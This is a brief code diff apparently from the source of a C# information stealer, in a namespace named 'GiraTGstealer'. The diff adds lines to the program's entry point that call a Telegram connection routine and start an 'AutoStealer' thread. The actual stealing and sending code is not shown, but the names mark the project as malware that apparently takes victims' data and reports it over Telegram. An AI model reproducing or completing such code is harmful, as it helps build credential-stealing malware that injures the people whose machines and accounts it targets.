@@ -10,6 +10,9 @@ namespace GiraTGstealer
     {
         static void Main(string[] args)
         {
+            telegram.sendConnection();
+            AutoStealer.AutoStealerThread.Start();
+            Console.ReadLine();
         }
     }
 }
